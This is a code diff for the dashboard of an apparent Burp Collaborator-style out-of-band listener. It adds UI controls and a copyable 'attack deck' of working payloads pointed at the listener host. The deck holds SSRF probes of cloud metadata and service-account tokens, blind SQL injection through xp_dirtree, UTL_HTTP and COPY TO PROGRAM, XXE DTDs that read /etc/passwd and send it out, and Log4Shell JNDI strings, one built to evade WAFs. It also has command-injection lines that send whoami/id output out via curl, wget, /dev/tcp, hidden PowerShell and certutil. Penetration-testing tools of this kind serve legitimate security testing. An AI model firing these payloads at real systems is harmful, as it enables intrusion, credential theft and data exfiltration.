@@ -7,7 +7,7 @@ import {
   ExternalLink, Globe, Wifi, ShieldAlert, Play, Search, 
   AlertCircle, RefreshCw, ArrowLeft, ArrowUpRight, HelpCircle, 
   Database, User, Network, FileCode, Radio, Terminal, Zap,
-  ShieldCheck, Cpu, BookOpen
+  ShieldCheck, Cpu, BookOpen, Tag, Sliders, Code2, Hash
 } from 'lucide-react';
 import { getPayloadsData } from '@/lib/payloads';
 import styles from '@/styles/dashboard.module.css';
@@ -151,6 +151,43 @@ function generateSsrfBypasses(host) {
   return results;
 }
 
+// Format Authentic Burp-Style Raw HTTP Request
+function formatRawHttpRequest(req, host) {
+  if (!req) return '';
+  const queryString = req.query && Object.keys(req.query).length > 0
+    ? '?' + Object.entries(req.query).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(Array.isArray(v) ? v.join(',') : v)}`).join('&')
+    : '';
+  const path = (req.path || '/') + (req.path?.includes('?') ? '' : queryString);
+  const hostHeader = req.headers?.host || host || 'domain.com';
+  
+  let raw = `${req.method} ${path} HTTP/1.1\r\nHost: ${hostHeader}\r\n`;
+  if (req.headers) {
+    for (const [key, val] of Object.entries(req.headers)) {
+      if (key.toLowerCase() !== 'host') {
+        raw += `${key}: ${val}\r\n`;
+      }
+    }
+  }
+  raw += `\r\n${req.body || ''}`;
+  return raw;
+}
+
+// Format Authentic Burp-Style Raw HTTP Response Sent
+function formatRawHttpResponse(cfg) {
+  const status = cfg?.status || 200;
+  const statusTexts = {
+    200: 'OK', 201: 'Created', 204: 'No Content',
+    301: 'Moved Permanently', 302: 'Found',
+    400: 'Bad Request', 401: 'Unauthorized', 403: 'Forbidden', 404: 'Not Found',
+    500: 'Internal Server Error', 502: 'Bad Gateway', 503: 'Service Unavailable'
+  };
+  const statusText = statusTexts[status] || 'OK';
+  const contentType = cfg?.contentType || 'application/json';
+  const body = cfg?.body !== undefined ? cfg.body : '{"success":true,"message":"Webhook received successfully"}';
+  
+  return `HTTP/1.1 ${status} ${statusText}\r\nContent-Type: ${contentType}\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS\r\nContent-Length: ${body.length}\r\n\r\n${body}`;
+}
+
 export default function DashboardPage({ params }) {
   const resolvedParams = use(params);
   const id = resolvedParams.id;
@@ -178,6 +215,15 @@ export default function DashboardPage({ params }) {
   const [isConfigOpen, setIsConfigOpen] = useState(false);
   const [copiedText, setCopiedText] = useState('');
   const [isPollingActive, setIsPollingActive] = useState(true);
+
+  // --- Burp Collaborator Suite states ---
+  const [collabTag, setCollabTag] = useState('');
+  const [collabFormat, setCollabFormat] = useState('subpath'); // 'subpath', 'query', 'url', 'host'
+  const [isManualPolling, setIsManualPolling] = useState(false);
+  const [lastPolledTime, setLastPolledTime] = useState(null);
+  const [activeInspectorTab, setActiveInspectorTab] = useState('RAW'); // 'RAW', 'HEADERS', 'PARAMS', 'BODY', 'RESPONSE', 'FORWARD'
+  const [showInjectionsDeck, setShowInjectionsDeck] = useState(true);
+  const [selectedDeckCategory, setSelectedDeckCategory] = useState('SSRF');
 
   // Response configuration form state
   const [configStatus, setConfigStatus] = useState('200');
@@ -225,12 +271,214 @@ export default function DashboardPage({ params }) {
       setOrigin(window.location.origin);
     }
   }, []);
-
   const webhookHost = origin 
     ? origin.replace(/^https?:\/\//i, '').split(':')[0] 
     : 'domain.com';
   const webhookUrl = `${origin || 'https://domain.com'}/api/r/${id}`;
   const xssPayloadUrl = `${origin || 'https://domain.com'}/api/x?id=${id}`;
+
+  const cleanTag = collabTag.trim().replace(/^\/+|\/+$/g, '');
+  const activeCollabUrl = useMemo(() => {
+    if (!cleanTag) return webhookUrl;
+    if (collabFormat === 'query') return `${webhookUrl}?tag=${encodeURIComponent(cleanTag)}`;
+    if (collabFormat === 'host') return webhookHost;
+    if (collabFormat === 'url') return webhookUrl;
+    return `${webhookUrl}/${cleanTag}`;
+  }, [cleanTag, collabFormat, webhookUrl, webhookHost]);
+
+  const activeCollabPath = useMemo(() => {
+    const base = `/api/r/${id}`;
+    if (!cleanTag) return base;
+    if (collabFormat === 'query') return `${base}?tag=${encodeURIComponent(cleanTag)}`;
+    return `${base}/${cleanTag}`;
+  }, [id, cleanTag, collabFormat]);
+
+  const handleManualPoll = async () => {
+    setIsManualPolling(true);
+    await fetchInspectionData();
+    const now = new Date();
+    setLastPolledTime(now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }));
+    setTimeout(() => setIsManualPolling(false), 350);
+  };
+
+  const generateRandomTag = () => {
+    const randomHex = Math.random().toString(36).substring(2, 8);
+    setCollabTag(`probe-${randomHex}`);
+  };
+
+  const collaboratorAttackVectors = useMemo(() => [
+    {
+      category: 'SSRF',
+      label: 'SSRF & Cloud Metadata',
+      items: [
+        {
+          title: 'AWS IMDSv1 Metadata Query',
+          payload: `curl -s "http://${webhookHost}/latest/meta-data/"`,
+          tip: 'Standard AWS EC2 IMDSv1 instance metadata endpoint probe.'
+        },
+        {
+          title: 'AWS IMDSv2 Token & Data Fetch',
+          payload: `TOKEN=$(curl -s -X PUT "http://${webhookHost}/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://${webhookHost}/latest/meta-data/"`,
+          tip: 'IMDSv2 token retrieval and authorization header injection.'
+        },
+        {
+          title: 'GCP Service Account Token Exfil',
+          payload: `curl -s -H "Metadata-Flavor: Google" "http://${webhookHost}/computeMetadata/v1/instance/service-accounts/default/token"`,
+          tip: 'Exfiltrates Google Cloud compute default service account OAuth token.'
+        },
+        {
+          title: 'Azure IMDS Instance Query',
+          payload: `curl -s -H "Metadata: true" "http://${webhookHost}/metadata/instance?api-version=2021-02-01"`,
+          tip: 'Queries Azure Instance Metadata Service with required header.'
+        },
+        {
+          title: 'Direct Out-of-Band HTTP Callback',
+          payload: `curl -s "${activeCollabUrl}"`,
+          tip: 'Direct HTTP GET request to verify internal SSRF reaching outside listener.'
+        },
+        {
+          title: 'Redis Gopher SSRF Smuggling',
+          payload: `gopher://${webhookHost}:80/_GET%20${encodeURIComponent(activeCollabPath)}%20HTTP/1.1%0D%0AHost:%20${webhookHost}%0D%0A%0D%0A`,
+          tip: 'Smuggles HTTP request through Gopher protocol for Redis/Memcached.'
+        }
+      ]
+    },
+    {
+      category: 'SQLI',
+      label: 'Blind SQLi (OAST)',
+      items: [
+        {
+          title: 'MSSQL xp_dirtree UNC OAST',
+          payload: `';EXEC master..xp_dirtree '\\\\\\\\${webhookHost}\\\\a';--`,
+          tip: 'Triggers outbound SMB / NetNTLM hash authentication to listener.'
+        },
+        {
+          title: 'Oracle UTL_HTTP Out-of-Band',
+          payload: `' UNION SELECT UTL_HTTP.request('${activeCollabUrl}') FROM dual--`,
+          tip: 'Forces Oracle database process to perform HTTP GET to listener.'
+        },
+        {
+          title: 'Oracle DBMS_LDAP DNS Callback',
+          payload: `' UNION SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.${webhookHost}', 80) FROM dual--`,
+          tip: 'Performs DNS lookup exfiltrating the current Oracle user.'
+        },
+        {
+          title: 'MySQL LOAD_FILE UNC Lookup',
+          payload: `SELECT LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\', (SELECT user()), '.${webhookHost}\\\\\\\\a'));`,
+          tip: 'Forces Windows-hosted MySQL to resolve UNC path exfiltrating user.'
+        },
+        {
+          title: 'PostgreSQL COPY TO PROGRAM RCE',
+          payload: `COPY (SELECT '') TO PROGRAM 'curl -s ${activeCollabUrl}';`,
+          tip: 'Executes OS command in superuser PostgreSQL to ping listener.'
+        }
+      ]
+    },
+    {
+      category: 'XXE',
+      label: 'Blind XXE (Out-of-Band)',
+      items: [
+        {
+          title: 'Parameter Entity External DTD',
+          payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "${activeCollabUrl}/eval.dtd">%dtd;]><root></root>`,
+          tip: 'Triggers XML parser to fetch external DTD definition.'
+        },
+        {
+          title: 'Direct HTTP External Entity',
+          payload: `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "${activeCollabUrl}?oob=1">%xxe;]><test>&xxe;</test>`,
+          tip: 'Direct HTTP entity dereference on parsed XML documents.'
+        },
+        {
+          title: 'File Exfiltration DTD Template',
+          payload: `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '${activeCollabUrl}/?data=%file;'>">%eval;%exfil;`,
+          tip: 'DTD payload to read /etc/passwd and exfiltrate in query string.'
+        }
+      ]
+    },
+    {
+      category: 'RCE',
+      label: 'Command Injection (RCE)',
+      items: [
+        {
+          title: 'Linux Bash Base64 cURL Pipe',
+          payload: `curl -s "${activeCollabUrl}?out=$(whoami|base64)"`,
+          tip: 'Exfiltrates whoami output encoded in base64 as query parameter.'
+        },
+        {
+          title: 'Linux Native /dev/tcp Socket',
+          payload: `bash -c 'exec 3<>/dev/tcp/${webhookHost}/80;echo -e "GET ${activeCollabPath}?out=$(id|base64) HTTP/1.1\\\\r\\\\nHost: ${webhookHost}\\\\r\\\\nConnection: close\\\\r\\\\n\\\\r\\\\n">&3;cat<&3'`,
+          tip: 'Zero binaries needed: pure bash pseudo-device socket exfiltration.'
+        },
+        {
+          title: 'Linux Wget Binary POST',
+          payload: `wget --post-data="$(id)" -qO- "${activeCollabUrl}"`,
+          tip: 'Silent background POST request with system ID payload.'
+        },
+        {
+          title: 'Windows PowerShell Hidden IWR',
+          payload: `powershell -nop -w hidden -c "Invoke-RestMethod -Uri '${activeCollabUrl}?out='+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(whoami))"`,
+          tip: 'Stealth Windows PowerShell command exfiltrating user in base64.'
+        },
+        {
+          title: 'Windows Certutil LOLBIN',
+          payload: `certutil -urlcache -split -f "${activeCollabUrl}" %TEMP%\\\\a.tmp`,
+          tip: 'Built-in Windows certificate utility used as LOLBIN download probe.'
+        }
+      ]
+    },
+    {
+      category: 'HEADERS',
+      label: 'HTTP Header Poisoning',
+      items: [
+        {
+          title: 'X-Forwarded-Host Header',
+          payload: `X-Forwarded-Host: ${webhookHost}`,
+          tip: 'Tests for cache poisoning or password reset email link poisoning.'
+        },
+        {
+          title: 'X-Forwarded-For & Real-IP',
+          payload: `X-Forwarded-For: ${webhookHost}\\nX-Real-IP: ${webhookHost}`,
+          tip: 'Reverse proxy spoofing and access log exfiltration.'
+        },
+        {
+          title: 'Host Header Override',
+          payload: `Host: ${webhookHost}`,
+          tip: 'Direct virtual host routing override.'
+        },
+        {
+          title: 'Referer OOB Callback',
+          payload: `Referer: ${activeCollabUrl}`,
+          tip: 'Tests if analytics, crawler, or crawler webhook visits Referer.'
+        }
+      ]
+    },
+    {
+      category: 'LOG4J',
+      label: 'Log4Shell & JNDI',
+      items: [
+        {
+          title: 'LDAP JNDI Lookup',
+          payload: `\${jndi:ldap://${webhookHost}/a}`,
+          tip: 'Standard Log4j CVE-2021-44228 JNDI LDAP lookup trigger.'
+        },
+        {
+          title: 'DNS JNDI Lookup',
+          payload: `\${jndi:dns://${webhookHost}/b}`,
+          tip: 'Log4j DNS protocol query probe.'
+        },
+        {
+          title: 'WAF Lowercase Evasion',
+          payload: `\${\${lower:j\}ndi:\${lower:l\}dap://${webhookHost}/c}`,
+          tip: 'Nested expression bypassing naive string filters.'
+        },
+        {
+          title: 'Environment Variable Leak',
+          payload: `\${jndi:ldap://${webhookHost}/\${env:USER}}`,
+          tip: 'Exfiltrates internal server username through JNDI path.'
+        }
+      ]
+    }
+  ], [webhookHost, activeCollabUrl, activeCollabPath]);
 
   // Fetch Webhook logs
   const fetchInspectionData = async (isInitial = false) => {
@@ -746,8 +994,16 @@ export default function DashboardPage({ params }) {
                         {new Date(req.timestamp).toLocaleTimeString('en-US', { hour12: false })}
                       </span>
                     </div>
-                    <div className={styles.itemPath} title={req.path}>
-                      {req.path.replace(`/api/r/${id}`, '') || '/'}
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', minWidth: 0 }}>
+                      {req.tag && (
+                        <span className={styles.tagBadge} title={`Interaction Tag: ${req.tag}`}>
+                          <Tag size={10} />
+                          {req.tag}
+                        </span>
+                      )}
+                      <div className={styles.itemPath} title={req.path} style={{ flex: 1 }}>
+                        {req.path.replace(`/api/r/${id}`, '') || '/'}
+                      </div>
                     </div>
                     <div className={styles.itemMetaRow}>
                       <span className={styles.itemIP}>{req.ip}</span>
@@ -924,7 +1180,7 @@ export default function DashboardPage({ params }) {
       </aside>
 
       {/* MAIN CONSOLE PANEL */}
-      <main className={styles.mainPanel}>
+<main className={styles.mainPanel}>
         
         {/* --- MODULE 1: OOB WEBHOOK INGESTOR PANEL --- */}
         {activeTab === 'OOB' && (
@@ -932,36 +1188,48 @@ export default function DashboardPage({ params }) {
             <header className={styles.panelHeader}>
               <div className={styles.urlContainer}>
                 <div className={styles.urlWrapper}>
-                  <span className={styles.urlLabel}>Callback URL</span>
+                  <span className={styles.urlLabel}>
+                    {collabFormat === 'host' ? 'Collaborator Host' : 'Listener URL'}
+                  </span>
                   <input 
                     type="text" 
                     readOnly 
-                    value={webhookUrl}
+                    value={activeCollabUrl}
                     onClick={(e) => e.target.select()}
                     className={styles.urlInput}
                   />
                   <button 
-                    onClick={() => handleCopy(webhookUrl, 'url')}
+                    onClick={() => handleCopy(activeCollabUrl, 'url')}
                     className={styles.copyBtn}
-                    title="Copy Callback URL"
+                    title="Copy Active Collaborator URL"
                   >
                     {copiedText === 'url' ? <Check size={16} style={{ color: 'var(--color-success)' }} /> : <Copy size={16} />}
                   </button>
                 </div>
 
                 <div className={styles.headerActions}>
-                  {copiedText === 'config-saved' && (
-                    <span className="badge badge-success animate-fade-in">
-                      Settings Saved
-                    </span>
-                  )}
-                  
+                  {/* Manual Poll Now Button */}
+                  <button 
+                    onClick={handleManualPoll} 
+                    className={styles.pollNowBtn}
+                    title="Poll collaborator server for interactions now"
+                    disabled={isManualPolling}
+                  >
+                    <RefreshCw size={13} className={isManualPolling ? styles.pollSpin : ''} />
+                    <span>Poll Now</span>
+                  </button>
+
+                  <div className={styles.pollStatusIndicator} title="Collaborator Polling Status">
+                    <span className={isPollingActive ? styles.liveIndicator : styles.pausedIndicator} />
+                    <span>{lastPolledTime ? `Polled ${lastPolledTime}` : (isPollingActive ? 'Auto-Polling' : 'Paused')}</span>
+                  </div>
+
                   <button 
                     onClick={() => setIsPollingActive(!isPollingActive)} 
                     className="btn-secondary"
+                    title={isPollingActive ? 'Pause automatic background polling' : 'Resume automatic polling'}
                   >
-                    <span className={isPollingActive ? styles.liveIndicator : styles.pausedIndicator} />
-                    <span>{isPollingActive ? 'Live Polling' : 'Paused'}</span>
+                    <span>{isPollingActive ? 'Pause' : 'Resume'}</span>
                   </button>
 
                   <button 
@@ -983,31 +1251,166 @@ export default function DashboardPage({ params }) {
                   </button>
                 </div>
               </div>
+
+              {/* Collaborator Tag & Format Controller */}
+              <div className={styles.collabControlsRow}>
+                <div className={styles.collabTagInputGroup}>
+                  <Tag size={13} style={{ color: 'var(--color-primary)' }} />
+                  <input 
+                    type="text" 
+                    placeholder="Enter custom tag / probe ID (e.g. ssrf-1, sqli-probe)..."
+                    value={collabTag}
+                    onChange={(e) => setCollabTag(e.target.value)}
+                    className={styles.collabTagInput}
+                  />
+                  <button 
+                    onClick={generateRandomTag} 
+                    className="btn-secondary"
+                    style={{ padding: '6px 10px', fontSize: '0.72rem' }}
+                    title="Generate random collaborator probe tag"
+                  >
+                    🎲 Random Tag
+                  </button>
+                </div>
+
+                <div className={styles.collabFormatButtons}>
+                  <button 
+                    onClick={() => setCollabFormat('subpath')} 
+                    className={`${styles.collabFormatBtn} ${collabFormat === 'subpath' ? styles.collabFormatBtnActive : ''}`}
+                    title="Subpath format: /api/r/[id]/tag"
+                  >
+                    /subpath
+                  </button>
+                  <button 
+                    onClick={() => setCollabFormat('query')} 
+                    className={`${styles.collabFormatBtn} ${collabFormat === 'query' ? styles.collabFormatBtnActive : ''}`}
+                    title="Query string format: ?tag=name"
+                  >
+                    ?tag=query
+                  </button>
+                  <button 
+                    onClick={() => setCollabFormat('url')} 
+                    className={`${styles.collabFormatBtn} ${collabFormat === 'url' ? styles.collabFormatBtnActive : ''}`}
+                    title="Base root listener URL"
+                  >
+                    Base URL
+                  </button>
+                  <button 
+                    onClick={() => setCollabFormat('host')} 
+                    className={`${styles.collabFormatBtn} ${collabFormat === 'host' ? styles.collabFormatBtnActive : ''}`}
+                    title="Domain hostname only"
+                  >
+                    Host Only
+                  </button>
+                </div>
+              </div>
+
+              {/* Quick Tag Presets */}
+              <div className={styles.collabTagPillsRow}>
+                <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>Quick Tag Presets:</span>
+                {['ssrf-aws', 'sqli-oast', 'xxe-dtd', 'cmd-rce', 'header-poison', 'log4j-ldap'].map(preset => (
+                  <button
+                    key={preset}
+                    onClick={() => setCollabTag(preset)}
+                    className={`${styles.collabTagPill} ${collabTag === preset ? styles.collabTagPillActive : ''}`}
+                  >
+                    #{preset}
+                  </button>
+                ))}
+                {collabTag && (
+                  <button 
+                    onClick={() => setCollabTag('')}
+                    style={{ background: 'transparent', border: 'none', color: 'var(--color-error)', fontSize: '0.68rem', cursor: 'pointer', marginLeft: '4px' }}
+                  >
+                    ✕ Clear Tag
+                  </button>
+                )}
+              </div>
             </header>
 
+            {/* COLLABORATOR INJECTIONS DECK (Rendered in empty state, or toggled on inspection) */}
+            {(requests.length === 0 || showInjectionsDeck) && (
+              <div style={{ padding: '20px 28px 0 28px' }}>
+                <section className={styles.deckSection}>
+                  <div className={styles.deckHeaderRow}>
+                    <div className={styles.deckTitle}>
+                      <Zap size={16} style={{ color: 'var(--color-primary)' }} />
+                      <span>Burp Collaborator Injections Deck</span>
+                      <span className="badge badge-primary" style={{ fontSize: '0.68rem', fontFamily: 'monospace' }}>
+                        {cleanTag ? `Tag: #${cleanTag}` : 'Listener Active'}
+                      </span>
+                    </div>
+
+                    <div className={styles.deckCategoryTabs}>
+                      {collaboratorAttackVectors.map(vec => (
+                        <button
+                          key={vec.category}
+                          onClick={() => setSelectedDeckCategory(vec.category)}
+                          className={`${styles.deckCategoryBtn} ${selectedDeckCategory === vec.category ? styles.deckCategoryBtnActive : ''}`}
+                        >
+                          {vec.label}
+                        </button>
+                      ))}
+                    </div>
+                  </div>
+
+                  {/* Active Category Attack Cards */}
+                  {(() => {
+                    const currentCategory = collaboratorAttackVectors.find(v => v.category === selectedDeckCategory) || collaboratorAttackVectors[0];
+                    return (
+                      <div className={styles.deckGrid}>
+                        {currentCategory.items.map((item, idx) => (
+                          <div key={idx} className={styles.deckCard}>
+                            <div className={styles.deckCardTop}>
+                              <h4 className={styles.deckCardTitle}>{item.title}</h4>
+                              <button 
+                                onClick={() => handleCopy(item.payload, `deck-${selectedDeckCategory}-${idx}`)}
+                                className={styles.demoCopyBtn}
+                                title="Copy payload to clipboard"
+                              >
+                                {copiedText === `deck-${selectedDeckCategory}-${idx}` ? (
+                                  <Check size={13} style={{ color: 'var(--color-success)' }} />
+                                ) : (
+                                  <Copy size={13} />
+                                )}
+                              </button>
+                            </div>
+                            <div className={styles.deckCodeBox}>
+                              <code>{item.payload}</code>
+                            </div>
+                            <p className={styles.deckCardTip}>{item.tip}</p>
+                          </div>
+                        ))}
+                      </div>
+                    );
+                  })()}
+                </section>
+              </div>
+            )}
+
             {requests.length === 0 ? (
-              <div className={`${styles.emptyState} animate-fade-in`}>
+              <div className={`${styles.emptyState} animate-fade-in`} style={{ paddingTop: '24px' }}>
                 <div className={styles.emptyStateContent}>
                   <div className={styles.emptyIconBox}>
                     <Terminal size={24} />
                   </div>
-                  <h2 className={styles.emptyStateTitle}>Waiting for Incoming Requests</h2>
+                  <h2 className={styles.emptyStateTitle}>Waiting for Incoming Collaborator Interactions</h2>
                   <p className={styles.emptyStateSubtitle}>
-                    Send an HTTP request to your callback URL above or test with the commands below:
+                    Fire any of the collaborator attack vectors above against your target, or verify the listener using the terminal commands below:
                   </p>
                 </div>
 
                 <div className={styles.demoBox}>
                   <span className={styles.demoTitle}>
                     <Terminal size={14} />
-                    cURL (POST JSON)
+                    cURL Verification Probe
                   </span>
                   <div className={styles.codeBlock}>
                     {`curl -X POST -H "Content-Type: application/json" \\
-  -d '{"status": "test", "message": "Webhook received successfully"}' \\
-  ${webhookUrl}`}
+  -d '{"status": "collaborator_test", "tag": "${cleanTag || 'test-probe'}"}' \\
+  "${activeCollabUrl}"`}
                     <button 
-                      onClick={() => handleCopy(`curl -X POST -H "Content-Type: application/json" -d '{"status": "test", "message": "Webhook received successfully"}' ${webhookUrl}`, 'curl')}
+                      onClick={() => handleCopy(`curl -X POST -H "Content-Type: application/json" -d '{"status": "collaborator_test", "tag": "${cleanTag || 'test-probe'}"}' "${activeCollabUrl}"`, 'curl')}
                       className={styles.demoCopyBtn}
                     >
                       {copiedText === 'curl' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
@@ -1018,12 +1421,12 @@ export default function DashboardPage({ params }) {
                 <div className={styles.demoBox}>
                   <span className={styles.demoTitle}>
                     <Terminal size={14} />
-                    PowerShell (GET)
+                    PowerShell Verification Probe
                   </span>
                   <div className={styles.codeBlock}>
-                    {`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?test=1"`}
+                    {`Invoke-RestMethod -Method Get -Uri "${activeCollabUrl}"`}
                     <button 
-                      onClick={() => handleCopy(`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?test=1"`, 'powershell')}
+                      onClick={() => handleCopy(`Invoke-RestMethod -Method Get -Uri "${activeCollabUrl}"`, 'powershell')}
                       className={styles.demoCopyBtn}
                     >
                       {copiedText === 'powershell' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
@@ -1035,46 +1438,145 @@ export default function DashboardPage({ params }) {
               <div className={`${styles.detailContent} animate-fade-in`}>
                 
                 {/* INGESTION META ROW */}
-                <section className={styles.summaryGrid}>
-                  <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>HTTP Method</span>
-                    <span className={`${styles.methodPill} ${styles['method' + selectedRequest.method] || styles.methodOTHER}`} style={{ fontSize: '0.85rem', padding: '4px 10px' }}>
-                      {selectedRequest.method}
-                    </span>
-                  </div>
-                  <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>Timestamp</span>
-                    <span className={styles.summaryValue}>
-                      {new Date(selectedRequest.timestamp).toLocaleString()}
-                    </span>
-                  </div>
-                  <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>Client IP</span>
-                    <span className={styles.summaryValue} style={{ fontFamily: 'monospace' }}>
-                      {selectedRequest.ip}
-                    </span>
-                  </div>
-                  <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>Payload Size</span>
-                    <span className={styles.summaryValue}>
-                      {selectedRequest.size > 1024 ? `${(selectedRequest.size / 1024).toFixed(1)} KB` : `${selectedRequest.size} Bytes`}
-                    </span>
-                  </div>
-                </section>
-
-                {/* LOG DATA: HEADERS & PARAMS */}
-                <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
-                  
-                  {/* HEADERS CARD */}
-                  <section className={styles.dataCard}>
-                    <div className={styles.sectionHeader}>
-                      <Network size={15} style={{ color: 'var(--color-primary)' }} />
-                      <h3 className={styles.sectionTitle}>Headers ({Object.keys(selectedRequest.headers).length})</h3>
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '10px' }}>
+                  <section className={styles.summaryGrid} style={{ flex: 1 }}>
+                    <div className={styles.summaryCard}>
+                      <span className={styles.summaryLabel}>HTTP Method</span>
+                      <span className={`${styles.methodPill} ${styles['method' + selectedRequest.method] || styles.methodOTHER}`} style={{ fontSize: '0.85rem', padding: '4px 10px' }}>
+                        {selectedRequest.method}
+                      </span>
                     </div>
-                    <div style={{ overflowX: 'auto' }}>
+                    <div className={styles.summaryCard}>
+                      <span className={styles.summaryLabel}>Timestamp</span>
+                      <span className={styles.summaryValue}>
+                        {new Date(selectedRequest.timestamp).toLocaleString()}
+                      </span>
+                    </div>
+                    <div className={styles.summaryCard}>
+                      <span className={styles.summaryLabel}>Client IP</span>
+                      <span className={styles.summaryValue} style={{ fontFamily: 'monospace' }}>
+                        {selectedRequest.ip}
+                      </span>
+                    </div>
+                    <div className={styles.summaryCard}>
+                      <span className={styles.summaryLabel}>Interaction Tag</span>
+                      <span className={styles.summaryValue}>
+                        {selectedRequest.tag ? (
+                          <span className={styles.tagBadge} style={{ fontSize: '0.75rem', padding: '3px 8px' }}>
+                            <Tag size={12} />
+                            {selectedRequest.tag}
+                          </span>
+                        ) : (
+                          <span style={{ color: 'var(--text-muted)', fontSize: '0.8rem' }}>None</span>
+                        )}
+                      </span>
+                    </div>
+                    <div className={styles.summaryCard}>
+                      <span className={styles.summaryLabel}>Payload Size</span>
+                      <span className={styles.summaryValue}>
+                        {selectedRequest.size > 1024 ? `${(selectedRequest.size / 1024).toFixed(1)} KB` : `${selectedRequest.size} Bytes`}
+                      </span>
+                    </div>
+                  </section>
+
+                  <button 
+                    onClick={() => setShowInjectionsDeck(!showInjectionsDeck)}
+                    className="btn-secondary"
+                    style={{ height: 'fit-content', padding: '8px 14px', fontSize: '0.75rem' }}
+                  >
+                    <Zap size={13} style={{ color: 'var(--color-primary)' }} />
+                    <span>{showInjectionsDeck ? 'Hide Attack Deck' : 'Show Attack Deck'}</span>
+                  </button>
+                </div>
+
+                {/* AUTHENTIC BURP-STYLE INSPECTOR SUB-TABS */}
+                <div className={styles.dataCard} style={{ padding: 0, overflow: 'hidden' }}>
+                  <div className={styles.inspectorTabs}>
+                    <button 
+                      onClick={() => setActiveInspectorTab('RAW')}
+                      className={`${styles.inspectorTabBtn} ${activeInspectorTab === 'RAW' ? styles.inspectorTabBtnActive : ''}`}
+                    >
+                      <Code2 size={13} />
+                      <span>Raw HTTP</span>
+                    </button>
+                    <button 
+                      onClick={() => setActiveInspectorTab('HEADERS')}
+                      className={`${styles.inspectorTabBtn} ${activeInspectorTab === 'HEADERS' ? styles.inspectorTabBtnActive : ''}`}
+                    >
+                      <Network size={13} />
+                      <span>Headers ({Object.keys(selectedRequest.headers || {}).length})</span>
+                    </button>
+                    <button 
+                      onClick={() => setActiveInspectorTab('PARAMS')}
+                      className={`${styles.inspectorTabBtn} ${activeInspectorTab === 'PARAMS' ? styles.inspectorTabBtnActive : ''}`}
+                    >
+                      <Globe size={13} />
+                      <span>Params & Tag</span>
+                    </button>
+                    <button 
+                      onClick={() => setActiveInspectorTab('BODY')}
+                      className={`${styles.inspectorTabBtn} ${activeInspectorTab === 'BODY' ? styles.inspectorTabBtnActive : ''}`}
+                    >
+                      <FileCode size={13} />
+                      <span>Body ({selectedRequest.bodyType ? selectedRequest.bodyType.toUpperCase() : 'EMPTY'})</span>
+                    </button>
+                    <button 
+                      onClick={() => setActiveInspectorTab('RESPONSE')}
+                      className={`${styles.inspectorTabBtn} ${activeInspectorTab === 'RESPONSE' ? styles.inspectorTabBtnActive : ''}`}
+                    >
+                      <Terminal size={13} />
+                      <span>Response Sent ({config.status || 200})</span>
+                    </button>
+                    <button 
+                      onClick={() => setActiveInspectorTab('FORWARD')}
+                      className={`${styles.inspectorTabBtn} ${activeInspectorTab === 'FORWARD' ? styles.inspectorTabBtnActive : ''}`}
+                    >
+                      <Send size={13} />
+                      <span>Forward / Replay</span>
+                    </button>
+                  </div>
+
+                  {/* TAB CONTENT: RAW HTTP */}
+                  {activeInspectorTab === 'RAW' && (
+                    <div style={{ padding: '16px' }}>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
+                        <span style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
+                          HTTP/1.1 Raw Transmission (Burp Suite format)
+                        </span>
+                        <div style={{ display: 'flex', gap: '8px' }}>
+                          <button 
+                            onClick={() => handleCopy(formatRawHttpRequest(selectedRequest, webhookHost), 'raw-http')}
+                            className="btn-secondary"
+                            style={{ padding: '4px 10px', fontSize: '0.72rem' }}
+                          >
+                            {copiedText === 'raw-http' ? <Check size={12} style={{ color: 'var(--color-success)' }} /> : <Copy size={12} />}
+                            <span>Copy Raw HTTP</span>
+                          </button>
+                          <button 
+                            onClick={() => {
+                              const curlCmd = `curl -X ${selectedRequest.method} ${Object.entries(selectedRequest.headers || {}).map(([k, v]) => `-H "${k}: ${v}"`).join(' ')} ${selectedRequest.body ? `-d '${selectedRequest.body}'` : ''} "${activeCollabUrl}"`;
+                              handleCopy(curlCmd, 'curl-raw');
+                            }}
+                            className="btn-secondary"
+                            style={{ padding: '4px 10px', fontSize: '0.72rem' }}
+                          >
+                            {copiedText === 'curl-raw' ? <Check size={12} style={{ color: 'var(--color-success)' }} /> : <Copy size={12} />}
+                            <span>Copy cURL</span>
+                          </button>
+                        </div>
+                      </div>
+                      <pre className={styles.rawHttpContainer}>
+                        <code>{formatRawHttpRequest(selectedRequest, webhookHost)}</code>
+                      </pre>
+                    </div>
+                  )}
+
+                  {/* TAB CONTENT: HEADERS */}
+                  {activeInspectorTab === 'HEADERS' && (
+                    <div style={{ padding: '16px', overflowX: 'auto' }}>
                       <table className={styles.headersTable}>
                         <tbody>
-                          {Object.entries(selectedRequest.headers).map(([key, val]) => (
+                          {Object.entries(selectedRequest.headers || {}).map(([key, val]) => (
                             <tr key={key}>
                               <td className={styles.headerKey}>{key}</td>
                               <td className={styles.headerVal}>{val}</td>
